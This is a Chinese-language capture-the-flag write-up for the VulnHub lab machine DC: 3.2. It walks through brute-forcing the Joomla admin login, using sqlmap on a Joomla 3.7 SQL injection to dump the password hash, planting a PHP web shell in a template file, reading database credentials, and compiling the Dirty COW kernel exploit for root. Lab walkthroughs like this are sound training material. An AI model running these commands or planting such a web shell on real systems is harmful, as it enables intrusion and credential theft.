# DC: 3.2

2025.02.22 https://www.vulnhub.com/entry/dc-32,312/

[video](https://www.bilibili.com/video/BV1DgPKeNEuc/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
80/tcp open  http
```

80 web 是 Joomla CMS，并且发现一个用户名 admin ，http://192.168.5.40/README.txt发现版本 3.7 , 先尝试爆破密码，常使用一个小字典先进行爆破：

```
python3 ~/tools/blast/blast_joomla.py -u http://192.168.5.40 -w ~/tools/dict/passwd_1050.txt  -usr admin
```

得到用户登陆凭据: admin:snoopy 登陆系统 http://192.168.5.40/administrator/ 。

同时该版本也有一个 sql 注入可以利用,sqlmap 同样可以跑出用户的 admin 用户的哈希，然后使用 john 破解也可以得到密码：

```
sqlmap -u "http://192.168.5.40/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --batch --risk=3 --level=5 --random-agent -D "joomladb" --tables -p list[fullordering]

sqlmap -u "http://192.168.5.40/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --batch --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" -C name,password --dump

+--------+--------------------------------------------------------------+
| name   | password                                                     |
+--------+--------------------------------------------------------------+
| admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |
+--------+--------------------------------------------------------------+
```

在顶部菜单中，Extensions -> Templates -> Templates 选中一个主题 Beez3 ，编辑它的 error.php 页面，在最上面加入 php 一句话木马：`system($_GET['cmd']);`，然后点击保存。

通过下面的语句测试一句话是否成功：

```
curl -s 'http://192.168.5.40/templates/beez3/error.php?cmd=id'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

执行反弹命令到 kali 上，先查看到 joomla 的数据库配置文件：

```
www-data@DC-3:/var/www/html$ cat configuration.php

public $user = 'root';
public $password = 'squires';
public $db = 'joomladb';
public $dbprefix = 'd8uea_';
public $live_site = '';
public $secret = '7M6S1HqGMvt1JYkY';
```

数据库的 d8uea_users 表中没有其他用户。

没有找到提权到 DC3 的路径，看看内核版本 4.4.0-21-generic 可以使用脏牛，将 https://www.exploit-db.com/download/40847 下载到目标机器上，进行编译：

```
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cow.cpp -lutil
./dcow -s
```

获得最终 root flag：

```
root@DC-3:~# cat the-flag.txt
 __        __   _ _   ____                   _ _ _ _
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)


Congratulations are in order.  :-)

I hope you've enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!
```
